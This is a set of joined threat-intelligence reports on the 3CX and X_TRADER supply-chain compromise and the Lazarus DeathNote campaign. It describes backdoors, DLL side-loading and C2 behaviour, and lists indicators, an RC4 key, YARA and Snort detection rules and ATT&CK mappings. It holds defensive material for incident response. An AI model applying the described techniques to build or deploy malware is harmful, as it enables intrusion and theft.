Mandiant’s investigation was able to reconstruct the threat actor’s steps through our environment as they harvested credentials and moved laterally. Eventually, the threat actor was able to compromise both the Windows and macOS build environments. On the Windows build environment, the attacker deployed the TAXHAUL launcher and COLDCAT downloader which persisted by performing DLL hijacking for the IKEEXT service and ran with LocalSystem privileges. The macOS build server was compromised using a POOLRAT backdoor using LaunchDaemons as a persistence mechanism.
Attribution
Based on the Mandiant investigation into the 3CX intrusion and supply chain attack thus far, they attribute the activity to a threat actor cluster named UNC4736. Mandiant assesses with high confidence that UNC4736 has a North Korean nexus.
Indicators of Compromise
X_TRADER_r7.17.90p608.exe
SHA256: fbc50755913de619fb830fb95882e9703dbfda67dbd0f75bc17eadc9eda61370
SHA1: ced671856bbaef2f1878a2469fb44e9be8c20055
MD5: ef4ab22e565684424b4142b1294f1f4d
Setup.exe
SHA256: 6e11c02485ddd5a3798bf0f77206f2be37487ba04d3119e2d5ce12501178b378
SHA1: 3bda9ca504146ad5558939de9fece0700f57c1c0
MD5: 00a43d64f9b5187a1e1f922b99b09b77
Code signing certificate serial #
9599605970805149948
MsMpEng.exe
SHA256: 24d5dd3006c63d0f46fb33cbc1f576325d4e7e03e3201ff4a3c1ffa604f1b74a
SHA1: d7ba13662fbfb254acaad7ae10ad51e0bd631933
MD5: 19dbffec4e359a198daf4ffca1ab9165
Command and Control
Mandiant identified that malware within the 3CX environment made use of the following additional command and control infrastructure.
www.tradingtechnologies[.]com/trading/order-management
Going Forward
Our priority throughout this incident has been transparency around what we know as well as the actions we’ve taken.
As we wind down our incident investigation, 3CX has taken this opportunity to continue to strengthen our policies, practices, and technology to further protect against future attacks. With that, we’re announcing a 7 Step Security Action Plan. In this plan, we’re committing to actionable steps to harden our defenses. You can read in more detail here.
 
3CX Software Supply Chain Compromise Initiated by a Prior Software Supply Chain Compromise; Suspected North Korean Actor Responsible
JEFF JOHNSON, FRED PLAN, ADRIAN SANCHEZ, RENATO FONTANA, JAKE NICASTRO, DIMITER ANDONOV, MARIUS FODOREANU, DANIEL SCOTT
APR 20, 2023
19 MIN READ
|   LAST UPDATED: OCT 23, 2023
SUPPLY CHAIN
MALWARE
NORTH KOREA
In March 2023, Mandiant Consulting responded to a supply chain compromise that affected 3CX Desktop App software. During this response, Mandiant identified that the initial compromise vector of 3CX’s network was via malicious software downloaded from Trading Technologies website. This is the first time Mandiant has seen a software supply chain attack lead to another software supply chain attack.
Overview
3CX Desktop App is enterprise software that provides communications for its users including chat, video calls, and voice calls. In late March, 2023, a software supply chain compromise spread malware via a trojanized version of 3CX’s legitimate software that was available to download from their website. The affected software was 3CX DesktopApp 18.12.416 and earlier, which contained malicious code that ran a downloader, SUDDENICON, which in turn received additional command and control (C2) servers from encrypted icon files hosted on GitHub. The decrypted C2 server was used to download a third stage identified as ICONICSTEALER, a dataminer that steals browser information. Mandiant tracks this activity as UNC4736, a suspected North Korean nexus cluster of activity.
 Figure 1: 3CX software supply chain compromise linked to Trading Technologies software supply chain compromise
Software Supply Chain Exploitation Explained
Mandiant Consulting’s investigation of the 3CX supply chain compromise has uncovered the initial intrusion vector: a malware-laced software package distributed via an earlier software supply chain compromise that began with a tampered installer for X_TRADER, a software package provided by Trading Technologies (Figure 1). Mandiant determined that a complex loading process led to the deployment of VEILEDSIGNAL, a multi-stage modular backdoor, and its modules.
VEILEDSIGNAL Backdoor Analysis
Mandiant Consulting identified an installer with the filename X_TRADER_r7.17.90p608.exe (MD5: ef4ab22e565684424b4142b1294f1f4d) which led to the deployment of a malicious modular backdoor: VEILEDSIGNAL.
Although the X_TRADER platform was reportedly discontinued in 2020, it was still available for download from the legitimate Trading Technologies website in 2022. This file was signed with the subject “Trading Technologies International, Inc” and contained the executable file Setup.exe that was also signed with the same digital certificate. The code signing certificate used to digitally sign the malicious software was set to expire in October 2022.
The installer contains and executes Setup.exe which drops two trojanized DLLs and a benign executable. Setup.exe uses the benign executable to side-load one of the malicious DLLs. Side-loading relies on legitimate Windows executables to load and execute a malicious file that has been disguised as a legitimate dependency. The loaded malicious DLLs contains and uses SIGFLIP and DAVESHELL to decrypt and load the payload into memory from the other dropped malicious executable. SIGFLIP relies on RC4 stream-cipher to decrypt the payload of choice and uses the byte sequence FEEDFACE to find the shellcode, in this case DAVESHELL, during the decryption stage.
SIGFLIP and DAVESHELL extract and execute a modular backdoor, VEILEDSIGNAL, and two corresponding modules. VEILEDSIGNAL relies on the two extracted modules for process injection and communications with the C2 server.
VEILEDSIGNAL and the accompanying two components provide the following functionality:
•	The VEILEDSIGNAL backdoor supports three commands: send implant data, execute shellcode, and terminate itself.
•	The process injection module injects the C2 module in the first found process instance of Chrome, Firefox, or Edge. It also monitors the named pipe and reinjects the communication module if necessary.
•	The C2 module creates a Windows named pipe and listens for incoming communications, which it then sends to the C2 server encrypted with AES-256 in Galois Counter Mode (GCM).
The C2 configuration of the identified sample of VEILEDSIGNAL (MD5: c6441c961dcad0fe127514a918eaabd4) relied on the following hard-coded URL: www.tradingtechnologies[.]com/trading/order-management.
VEILEDSIGNAL Similarities and Code Comparison
The compromised X_TRADER and 3CXDesktopApp applications both contain, extract, and run a payload in the same way, although the final payload is different. Mandiant analyzed these samples and observed the following similarities:
•	Usage of the same RC4 key 3jB(2bsG#@c7 in the SIGFLIP tool configuration to encrypt and decrypt the payload.
•	Usage of SIGFLIP, a publicly available project on GitHub leveraging CVE-2013-3900 (MS13-098).
•	Reliance on DAVESHELL, a publicly available open-source project that converts PE-COFF files to position-independent code or shellcode and that leverages reflective loading techniques to load the payload in memory.
•	Use of the hardcoded cookie variable __tutma in the payloads.
•	Both payloads encrypt data with AES-256 GCM cipher.
Compromise of the 3CX Build Environment
The attacker used a compiled version of the publicly available Fast Reverse Proxy project, to move laterally within the 3CX organization during the attack. The file MsMpEng.exe (MD5: 19dbffec4e359a198daf4ffca1ab9165), was dropped in C:\Windows\System32 by the threat actor.
Mandiant was able to reconstruct the attacker’s steps throughout the environment as they harvested credentials and moved laterally. Eventually, the attacker was able to compromise both the Windows and macOS build environments. On the Windows build environment, the attacker deployed a TAXHAUL launcher and COLDCAT downloader that persisted by performing DLL search order hijacking through the IKEEXT service and ran with LocalSystem privileges. The macOS build server was compromised with POOLRAT backdoor using Launch Daemons as a persistence mechanism.
Previous reporting mentioned the macOS build server was compromised with SIMPLESEA. Mandiant Intelligence completed analysis of the sample and determined it to be the backdoor POOLRAT instead of a new malware family.
Threat Actor Spotlight: UNC4736
UNC4736 demonstrates varying degrees of overlap with multiple North Korean operators tracked by Mandiant Intelligence, especially with those involved in financially-motivated cybercrime operations. These clusters have demonstrated a sustained focus on cryptocurrency and fintech-related services over time.
Mandiant assesses with moderate confidence that UNC4736 is related to financially motivated North Korean “AppleJeus” activity as reported by CISA. This is further corroborated with findings from Google TAG who reported the compromise of www.tradingtechnologies[.]com in February 2022, preceding the distribution of compromised X_TRADER updates from the site.
•	TAG reported on a cluster of North Korean activity exploiting a remote code execution vulnerability in Chrome, CVE-2022-0609, and identified it as overlapping with “AppleJeus” targeting cryptocurrency services.
•	The site www.tradingtechnologies[.]com was compromised and hosting a hidden IFRAME to exploit visitors, just two months before the site was known to deliver a trojanized X_TRADER software package.
•	Within the 3CX environment, Mandiant identified the POOLRAT backdoor using journalide[.]org as its configured C2 server. 
•	An older sample of POOLRAT (MD5: 451c23709ecd5a8461ad060f6346930c) was previously reported by CISA as part of the trojanized CoinGoTrade application used in the AppleJeus operation (Figure 2).
o	The older sample’s infrastructure also has ties to another trojanized trading application, JMT Trading, also tracked under AppleJeus.
 Figure 2: POOLRAT Link to CoinGoTrade and JMT Trading Activity
Weak infrastructure overlap was also identified between UNC4736 and two clusters of suspected APT43 activity, UNC3782 and UNC4469.
•	DNS resolutions reveal infrastructure overlap between UNC4736 and activity linked to APT43 with moderate confidence (Tables 1 – 3)
•	APT43 frequently targets cryptocurrency users and related services, highlighting such campaigns are widespread across North Korea-nexus cyber operators.
Table 1: Resolutions for IP 89.45.67.160
Date	Domain	UNC
2022-12-20	curvefinances[.]com	UNC4469
2022-12-29	pbxphonenetwork[.]com	UNC4736
Table 2: Resolutions for IP 172.93.201.88
Date	Domain	UNC
2022-04-08	journalide[.]org	UNC4736
2021-11-26	nxmnv[.]site	UNC3782
Table 3: Resolutions for IP 185.38.151[.]11
Date	Domain	UNC
2023-01-09	msedgepackageinfo[.]com	UNC4736
2023-03-22	apollo-crypto.org.shilaerc20[.]com	UNC4469
Outlook and Implications
The identified software supply chain compromise is the first we are aware of which has led to a cascading software supply chain compromise. It shows the potential reach of this type of compromise, particularly when a threat actor can chain intrusions as demonstrated in this investigation. Research on UNC4736 activity suggests that it is most likely linked to financially motivated North Korean threat actors. Cascading software supply chain compromises demonstrate that North Korean operators can exploit network access in creative ways to develop and distribute malware, and move between target networks while conducting operations aligned with North Korea’s interests.
Malware Definitions
ICONICSTEALER
ICONICSTEALER is a C/C++ data miner that collects application configuration data as well as browser history.
DAVESHELL
DAVESHELL is shellcode that functions as an in-memory dropper. Its embedded payload is mapped into memory and executed.
SIGFLIP
SigFlip is a tool for patching authenticode signed PE-COFF files to inject arbitrary code without affecting or breaking the file's signature.
POOLRAT
POOLRAT is a C/C++ macOS backdoor capable of collecting basic system information and executing commands. The commands performed include running arbitrary commands, secure deleting files, reading and writing files, updating the configuration.
TAXHAUL
TAXHAUL is a DLL that, when executed, decrypts a shellcode payload expected at C:\Windows\System32\config\TxR\.TxR.0.regtrans-ms. Mandiant has seen TAXHAUL persist via DLL search order hijacking.
COLDCAT
COLDCAT is a complex downloader. COLDCAT generates unique host identifier information, and beacons it to a C2 that is specified in a separate file via POST request with the data in the cookie header. After a brief handshake, the malware expects base64 encoded shellcode to execute in response.
VEILEDSIGNAL
VEILEDSIGNAL is a backdoor written in C that is able to execute shellcode and terminate itself. Additionally, VEILEDSIGNAL relies on additional modules that connect via Windows named pipes to interact with the C2 infrastructure.
Acknowledgments
Special thanks to Michael Bailey, Willi Ballenthin, Michael Barnhart, and Jakub Jozwiak for their collaboration and review. Mandiant would also like to thank the Google Threat Analysis Group (TAG) and Microsoft Threat Intelligence Center (MSTIC) for their collaboration in this research.
Technical Annex: MITRE ATT&CK  
Resource Development
•	T1588 Obtain Capabilities  
•	T1588.004 Digital Certificates
•	T1608 Stage Capabilities  
•	T1608.003 Install Digital Certificate
Initial Access
•	T1190 Exploit Public-Facing Application
•	T1195 Supply Chain Compromise  
•	T1195.002 Compromise Software Supply Chain  
Persistence
•	T1574 Hijack Execution Flow
•	T1574.002 DLL Side-Loading
Privilege Escalation
•	T1055 Process Injection
•	T1574 Hijack Execution Flow  
•	T1574.002 DLL Side-Loading
Defense Evasion
•	T1027 Obfuscated Files or Information
•	T1036 Masquerading  
•	T1036.001 Invalid Code Signature
•	T1055 Process Injection
•	T1070 Indicator Removal  
•	T1070.001 Clear Windows Event Logs
•	T1070.004 File Deletion
•	T1112 Modify Registry
•	T1140 Deobfuscate/Decode Files or Information
•	T1497 Virtualization/Sandbox Evasion  
•	T1497.001 System Checks
•	T1574 Hijack Execution Flow  
•	T1574.002 DLL Side-Loading
•	T1620 Reflective Code Loading
•	T1622 Debugger Evasion
Discovery
•	T1012 Query Registry
•	T1082 System Information Discovery
•	T1083 File and Directory Discovery
•	T1497 Virtualization/Sandbox Evasion  
•	T1497.001 System Checks
•	T1614 System Location Discovery
•	T1614.001 System Language Discovery  
•	T1622 Debugger Evasion
Command and Control
•	T1071 Application Layer Protocol
•	T1071.001 Web Protocols
•	T1071.004 DNS  
•	T1105 Ingress Tool Transfer
•	T1573 Encrypted Channel
•	T1573.002 Asymmetric Cryptography  
Impact 
•	T1565 Data Manipulation  
•	T1565.001 Stored Data Manipulation
Technical Annex: Detection Rules
YARA Rules
rule M_Hunting_3CXDesktopApp_Key {
  meta:
    disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
    description = "Detects a key found in a malicious 3CXDesktopApp file"
    md5 = "74bc2d0b6680faa1a5a76b27e5479cbc"
    date = "2023/03/29"
    version = "1"
  strings:
    $key = "3jB(2bsG#@c7" wide ascii
  condition:
    $key
}
rule M_Hunting_3CXDesktopApp_Export {
  meta:
    disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
    description = "Detects an export used in 3CXDesktopApp malware"
    md5 = "7faea2b01796b80d180399040bb69835"
    date = "2023/03/31"
    version = "1"
  strings:
    $str1 = "DllGetClassObject" wide ascii
    $str2 = "3CXDesktopApp" wide ascii
  condition:
    all of ($str*)
}
rule TAXHAUL
{
  meta:
  author = "Mandiant"
  created = "04/03/2023"
  modified = "04/03/2023"
  version = "1.0"
  strings:
    $p00_0 = {410f45fe4c8d3d[4]eb??4533f64c8d3d[4]eb??4533f64c8d3d[4]eb}
    $p00_1 = {4d3926488b01400f94c6ff90[4]41b9[4]eb??8bde4885c074}
  condition:
    uint16(0) == 0x5A4D and any of them
}
rule M_Hunting_MSI_Installer_3CX_1
{
meta:
author = "Mandiant"
md5 = "0eeb1c0133eb4d571178b2d9d14ce3e9, f3d4144860ca10ba60f7ef4d176cc736"
strings:
$ss1 = { 20 00 5F 64 33 64 63 6F 6D 70 69 6C 65 72 5F 34 37 2E 64 6C 6C 5F }
$ss2 = { 20 00 5F 33 43 58 44 65 73 6B 74 6F 70 41 70 70 2E }
$ss3 = { 20 00 5F 66 66 6D 70 65 67 2E 64 6C 6C 5F }
$ss4 = "3CX Ltd1" ascii
$sc1 = { 1B 66 11 DF 9C 9A 4D 6E CC 8E D5 0C 9B 91 78 73 }
$sc2 = "202303" ascii
condition:
(uint32(0) == 0xE011CFD0) and filesize > 90MB and filesize < 105MB and all of them
}
rule M_Hunting_TAXHAUL_Hash_1
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
description = "Rule looks for hardcoded value used in string hashing algorithm observed in instances of TAXHAUL."
md5 = "e424f4e52d21c3da1b08394b42bc0829"
strings:
$c_x64 = { 25 A3 87 DE [4-20] 25 A3 87 DE [4-20] 25 A3 87 DE }
condition:
filesize < 15MB and uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x00004550 and any of them
}
rule M_Hunting_SigFlip_SigLoader_Native
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
description = "Rule looks for strings present in SigLoader (Native)"
md5 = "a3ccc48db9eabfed7245ad6e3a5b203f"
strings:
$s1 = "[*]: Basic Loader..." ascii wide
$s2 = "[!]: Missing PE path or Encryption Key..." ascii wide
$s3 = "[!]: Usage: %s  " ascii wide
$s4 = "[*]: Loading/Parsing PE File '%s'" ascii wide
$s5 = "[!]: Could not read file %s" ascii wide
$s6 = "[!]: '%s' is not a valid PE file" ascii wide
$s7 = "[+]: Certificate Table RVA %x" ascii wide
$s8 = "[+]: Certificate Table Size %d" ascii wide
$s9 = "[*]: Tag Found 0x%x%x%x%x" ascii wide
$s10 = "[!]: Could not locate data/shellcode" ascii wide
$s11 = "[+]: Encrypted/Decrypted Data Size %d" ascii wide
condition:
filesize < 15MB and uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x00004550 and 4 of ($s*)
}
rule M_Hunting_Raw64_DAVESHELL_Bootstrap
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
description = "Rule looks for bootstrap shellcode (64 bit) present in DAVESHELL"
md5 = "8a34adda5b981498234be921f86dfb27"
strings:
$b6ba50888f08e4f39b43ef67da27521dcfc61f1e = { E8 00 00 00 00 59 49 89 C8 48 81 C1 ?? ?? ?? ?? BA ?? ?? ?? ?? 49 81 C0 ?? ?? ?? ?? 41 B9 ?? ?? ?? ?? 56 48 89 E6 48 83 E4 F0 48 83 EC 30 C7 44 24 20 ?? ?? ?? ?? E8 ?? 00 00 00 48 89 F4 5E C3 }
$e32abbe82e1f957fb058c3770375da3bf71a8cab = { E8 00 00 00 00 59 49 89 C8 BA ?? ?? ?? ?? 49 81 C0 ?? ?? ?? ?? 41 B9 ?? ?? ?? ?? 56 48 89 E6 48 83 E4 F0 48 83 EC 30 48 89 4C 24 28 48 81 C1 ?? ?? ?? ?? C7 44 24 20 ?? ?? ?? ?? E8 ?? 00 00 00 48 89 F4 5E C3 }
condition:
filesize < 15MB and any of them
}
rule M_Hunting_MSI_Installer_3CX_1
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
description = "This rule looks for hardcoded values within the MSI installer observed in strings and signing certificate"
md5 = "0eeb1c0133eb4d571178b2d9d14ce3e9"
strings:
$ss1 = { 20 00 5F 64 33 64 63 6F 6D 70 69 6C 65 72 5F 34 37 2E 64 6C 6C 5F }
$ss2 = { 20 00 5F 33 43 58 44 65 73 6B 74 6F 70 41 70 70 2E }
$ss3 = { 20 00 5F 66 66 6D 70 65 67 2E 64 6C 6C 5F }
$ss4 = "3CX Ltd1" ascii
$sc1 = { 1B 66 11 DF 9C 9A 4D 6E CC 8E D5 0C 9B 91 78 73 }
$sc2 = "202303" ascii
condition:
(uint32(0) == 0xE011CFD0) and filesize > 90MB and filesize < 100MB and all of them
}
rule M_Hunting_VEILEDSIGNAL_1
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
md5 = "404b09def6054a281b41d309d809a428, c6441c961dcad0fe127514a918eaabd4"
strings:
$rh1 = { 68 5D 7A D2 2C 3C 14 81 2C 3C 14 81 2C 3C 14 81 77 54 10 80 26 3C 14 81 77 54 17 80 29 3C 14 81 77 54 11 80 AB 3C 14 81 D4 4C 11 80 33 3C 14 81 D4 4C 10 80 22 3C 14 81 D4 4C 17 80 25 3C 14 81 77 54 15 80 27 3C 14 81 2C 3C 15 81 4B 3C 14 81 94 4D 1D 80 28 3C 14 81 94 4D 14 80 2D 3C 14 81 94 4D 16 80 2D 3C 14 81 }
$rh2 = { 00 E5 A0 2B 44 84 CE 78 44 84 CE 78 44 84 CE 78 1F EC CA 79 49 84 CE 78 1F EC CD 79 41 84 CE 78 1F EC CB 79 C8 84 CE 78 BC F4 CA 79 4A 84 CE 78 BC F4 CD 79 4D 84 CE 78 BC F4 CB 79 65 84 CE 78 1F EC CF 79 43 84 CE 78 44 84 CF 78 22 84 CE 78 FC F5 C7 79 42 84 CE 78 FC F5 CE 79 45 84 CE 78 FC F5 CC 79 45 84 CE 78}
$rh3 = { DA D2 21 22 9E B3 4F 71 9E B3 4F 71 9E B3 4F 71 C5 DB 4C 70 94 B3 4F 71 C5 DB 4A 70 15 B3 4F 71 C5 DB 4B 70 8C B3 4F 71 66 C3 4B 70 8C B3 4F 71 66 C3 4C 70 8F B3 4F 71 C5 DB 49 70 9F B3 4F 71 66 C3 4A 70 B0 B3 4F 71 C5 DB 4E 70 97 B3 4F 71 9E B3 4E 71 F9 B3 4F 71 26 C2 46 70 9F B3 4F 71 26 C2 B0 71 9F B3 4F 71 9E B3 D8 71 9F B3 4F 71 26 C2 4D 70 9F B3 4F 71 }
$rh4 = { CB 8A 35 66 8F EB 5B 35 8F EB 5B 35 8F EB 5B 35 D4 83 5F 34 85 EB 5B 35 D4 83 58 34 8A EB 5B 35 D4 83 5E 34 09 EB 5B 35 77 9B 5E 34 92 EB 5B 35 77 9B 5F 34 81 EB 5B 35 77 9B 58 34 86 EB 5B 35 D4 83 5A 34 8C EB 5B 35 8F EB 5A 35 D3 EB 5B 35 37 9A 52 34 8C EB 5B 35 37 9A 58 34 8E EB 5B 35 37 9A 5B 34 8E EB 5B 35 37 9A 59 34 8E EB 5B 35 }
condition:
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 1 of ($rh*)
}
rule M_Hunting_VEILEDSIGNAL_2
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
md5 = "404b09def6054a281b41d309d809a428"
strings:
$sb1 = { C1 E0 05 4D 8? [2] 33 D0 45 69 C0 7D 50 BF 12 8B C2 41 FF C2 C1 E8 07 33 D0 8B C2 C1 E0 16 41 81 C0 87 D6 12 00 }
$si1 = "CryptBinaryToStringA" fullword
$si2 = "BCryptGenerateSymmetricKey" fullword
$si3 = "CreateThread" fullword
$ss1 = "ChainingModeGCM" wide
$ss2 = "__tutma" fullword
condition:
(uint16(0) == 0x5A4D) and (uint32(uint32(0x3C)) == 0x00004550) and (uint16(uint32(0x3C)+0x18) == 0x020B) and all of them
}
rule M_Hunting_VEILEDSIGNAL_3
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
md5 = "c6441c961dcad0fe127514a918eaabd4"
strings:
$ss1 = { 61 70 70 6C 69 63 61 74 69 6F 6E 2F 6A 73 6F 6E 2C 20 74 65 78 74 2F 6A 61 76 61 73 63 72 69 70 74 2C 20 2A 2F 2A 3B 20 71 3D 30 2E 30 31 00 00 61 63 63 65 70 74 00 00 65 6E 2D 55 53 2C 65 6E 3B 71 3D 30 2E 39 00 00 61 63 63 65 70 74 2D 6C 61 6E 67 75 61 67 65 00 63 6F 6F 6B 69 65 00 00 }
$si1 = "HttpSendRequestW" fullword
$si2 = "CreateNamedPipeW" fullword
$si3 = "CreateThread" fullword
$se1 = "DllGetClassObject" fullword
condition:
(uint16(0) == 0x5A4D) and (uint32(uint32(0x3C)) == 0x00004550) and (uint16(uint32(0x3C)+0x18) == 0x020B) and all of them
}
rule M_Hunting_VEILEDSIGNAL_4
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
md5 = "404b09def6054a281b41d309d809a428, c6441c961dcad0fe127514a918eaabd4"
strings:
$sb1 = { FF 15 FC 76 01 00 8B F0 85 C0 74 ?? 8D 50 01 [6-16] FF 15 [4] 48 8B D8 48 85 C0 74 ?? 89 ?? 24 28 44 8B CD 4C 8B C? 48 89 44 24 20 }
$sb2 = { 33 D2 33 C9 FF 15 [4] 4C 8B CB 4C 89 74 24 28 4C 8D 05 [2] FF FF 44 89 74 24 20 33 D2 33 C9 FF 15 }
$si1 = "CreateThread" fullword
$si2 = "MultiByteToWideChar" fullword
$si3 = "LocalAlloc" fullword
$se1 = "DllGetClassObject" fullword
condition:
(uint16(0) == 0x5A4D) and (uint32(uint32(0x3C)) == 0x00004550) and (uint16(uint32(0x3C)+0x18) == 0x020B) and all of them
}
rule M_Hunting_VEILEDSIGNAL_5
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
md5 = "6727284586ecf528240be21bb6e97f88"
strings:
$sb1 = { 48 8D 15 [4] 48 8D 4C 24 4C E8 [4] 85 C0 74 ?? 48 8D 15 [4] 48 8D 4C 24 4C E8 [4] 85 C0 74 ?? 48 8D 15 [4] 48 8D 4C 24 4C E8 [4] 85 C0 74 ?? 48 8D [3] 48 8B CB FF 15 [4] EB }
$ss1 = "chrome.exe" wide fullword
$ss2 = "firefox.exe" wide fullword
$ss3 = "msedge.exe" wide fullword
$ss4 = "\\\\.\\pipe\\*" ascii fullword
$ss5 = "FindFirstFileA" ascii fullword
$ss6 = "Process32FirstW" ascii fullword
$ss7 = "RtlAdjustPrivilege" ascii fullword
$ss8 = "GetCurrentProcess" ascii fullword
$ss9 = "NtWaitForSingleObject" ascii fullword
condition:
(uint16(0) == 0x5A4D) and (uint32(uint32(0x3C)) == 0x00004550) and (uint16(uint32(0x3C)+0x18) == 0x020B) and all of them
}
rule M_Hunting_VEILEDSIGNAL_6
{
meta:
author = "Mandiant"
disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
md5 = "00a43d64f9b5187a1e1f922b99b09b77"
strings:
$ss1 = "C:\\Programdata\\" wide
$ss2 = "devobj.dll" wide fullword
$ss3 = "msvcr100.dll" wide fullword
$ss4 = "TpmVscMgrSvr.exe" wide fullword
$ss5 = "\\Microsoft\\Windows\\TPM" wide fullword
$ss6 = "CreateFileW" ascii fullword
condition:
(uint16(0) == 0x5A4D) and (uint32(uint32(0x3C)) == 0x00004550) and (uint16(uint32(0x3C)+0x18) == 0x010B) and all of them
}
rule MTI_Hunting_POOLRAT {
  meta:
    author = "Mandiant"
    disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
    description = "Detects strings found in POOLRAT. "
    md5 = "451c23709ecd5a8461ad060f6346930c"
    date = "10/28/2020"
    version = "1"
  strings:
    $str1 = "name=\"uid\"%s%s%u%s" wide ascii
    $str2 = "name=\"session\"%s%s%u%s" wide ascii
    $str3 = "name=\"action\"%s%s%s%s" wide ascii
    $str4 = "name=\"token\"%s%s%u%s" wide ascii
    $boundary = "--N9dLfqxHNUUw8qaUPqggVTpX-" wide ascii nocase
  condition: 
    any of ($str*) or $boundary
}
rule M_Hunting_FASTREVERSEPROXY
{
      meta:
      author = "Mandiant"
      disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
      md5 = "19dbffec4e359a198daf4ffca1ab9165"
      strings:
      $ss1 = "Go build ID:" fullword
      $ss2 = "Go buildinf:" fullword
      $ss3 = "net/http/httputil.(*ReverseProxy)." ascii
      $ss4 = "github.com/fatedier/frp/client" ascii
      $ss5 = "\"server_port\"" ascii
      $ss6 = "github.com/armon/go-socks5.proxy" ascii
      condition:
      uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and all of them
}
Snort Rules
alert tcp any any -> any any (msg:"Possible malicious 3CXDesktopApp Identified"; content:"raw.githubusercontent.com/IconStorages/images/main/"; threshold:type limit, track by_src, count 1, seconds 3600; sid: 99999999;)
 
alert tcp any any -> any any (msg:"Possible malicious 3CXDesktopApp Identified"; content:"3cx_auth_id=%s\;3cx_auth_token_content=%s\;__tutma=true"; threshold:type limit, track by_src, count 1, seconds 3600; sid: 99999999;)
 
alert tcp any any -> any any (msg:"Possible malicious 3CXDesktopApp Identified"; content:"__tutma"; threshold:type limit, track by_src, count 1, seconds 3600; sid: 99999999;)
 
alert tcp any any -> any any (msg:"Possible malicious 3CXDesktopApp Identified"; content:"__tutmc"; threshold:type limit, track by_src, count 1, seconds 3600; sid: 99999999;)
Mandiant Security Validation
Organizations can validate their security controls using the following actions with Mandiant Security Validation.
VID	Name
A106-319	Command and Control - UNC4736, DNS Query, Variant #1
A106-321	Command and Control - UNC4736, DNS Query, Variant #2
A106-323	Command and Control - UNC4736, DNS Query, Variant #3
A106-324	Host CLI - UNC4736, 3CX Run Key, Registry Modification
A106-322	Malicious File Transfer - UNC4736, SUDDENICON, Download, Variant #1
S100-272	Evaluation: UNC4736 Conducting Supply Chain Attack Targeting 3CX Phone Management System

 
Following the Lazarus group by tracking DeathNote campaign
APT REPORTS
12 APR 2023
 8 minute read
 
AUTHORS
•	 SEONGSU PARK
The Lazarus group is a high-profile Korean-speaking threat actor with multiple sub-campaigns. We have previously published information about the connections of each cluster of this group. In this blog, we’ll focus on an active cluster that we dubbed DeathNote because the malware responsible for downloading additional payloads is named Dn.dll or Dn64.dll. This threat is also known as Operation DreamJob or NukeSped. Over the past few years, we have closely monitored the DeathNote cluster, observing a shift in their targets as well as the development and refinement of their tools, techniques, and procedures.
 
Timeline of DeathNote cluster
In this blog, we will provide an overview of the significant modifications that have taken place within this cluster, both in terms of its technical and strategic aspects.
Beginning of tracking DeathNote
The notorious threat actor Lazarus has persistently targeted cryptocurrency-related businesses for a long time. While monitoring the actor’s activities, we noticed that in one particular case they were using a significantly modified piece of malware. In mid-October 2019, we came across a suspicious document uploaded to VirusTotal. Upon further investigation, we discovered that the actor behind this weaponized document had been using similar malicious Word documents since October 2018. The malware author used decoy documents that were related to the cryptocurrency business such as a questionnaire about buying specific cryptocurrency, an introduction to a specific cryptocurrency, and an introduction to a bitcoin mining company.
 
Decoy documents
Once the victim opens the document and enables the macro, the malicious Visual Basic Script extracts the embedded downloader malware and loads it with specific parameters. In this initial discovery, the actor used two types of second-stage payload. The first is a manipulated piece of software that contains a malicious backdoor, while the second is a typical backdoor with a multi-stage binary infection process.
 
Infection procedure
The Trojanized application utilized in the second stage is masquerading as a genuine UltraVNC viewer. If executed without any command line parameters, it will display a legitimate UltraVNC viewer window. However, it carries out a malicious routine when it is spawned with “-s {F9BK1K0A-KQ9B-2PVH-5YKV-IY2JLT37QQCJ}” parameters. The other infection method executes the installer, which creates and registers an injector and backdoor in a Windows service. Finally, the backdoor is injected into a legitimate process (svchost.exe) and initiates a command-and-control (C2) operation. In this infection, the final payload injected into the legitimate process was Manuscrypt. Until this discovery, the Lazarus group had primarily targeted the cryptocurrency business. Our investigation has identified potential compromises of individuals or companies involved in cryptocurrency in Cyprus, the United States, Taiwan and Hong Kong.
Shifting focus to the defense industry
While tracking this campaign, we uncovered a significant shift in the attack’s target along with updated infection vectors in April 2020. Our research showed that the DeathNote cluster was used to target the automotive and academic sectors in Eastern Europe, both of which are connected to the defense industry. At this point, the actor switched all the decoy documents to job descriptions related to defense contractors and diplomatic services.
 
Decoy documents
In addition, the actor refined its infection chain, using the remote template injection technique in their weaponized documents, as well as utilizing Trojanized open-source PDF viewer software. Both of these infection methods result in the same malware (DeathNote downloader), which is responsible for uploading the victim’s information and retrieving the next-stage payload at the C2’s discretion. Finally, a COPPERHEDGE variant is executed in memory.
 
Infection chain
Notably, a Trojanized PDF reader, based on the open source software, used an interesting technique to initiate its malicious routine. It first retrieves the MD5 hash of the opened PDF file and performs an XOR operation on 65 bytes of embedded data using the retrieved MD5 value. Next, it verifies that the first WORD value of the XORed data is 0x4682, and checks that the MD5 hash value matches the last 16 bytes of the XORed data. If both conditions are met, the remaining 47-bytes value is used as the decryption key for the next stage of infection.
 
Verification process of Trojanized PDF reader
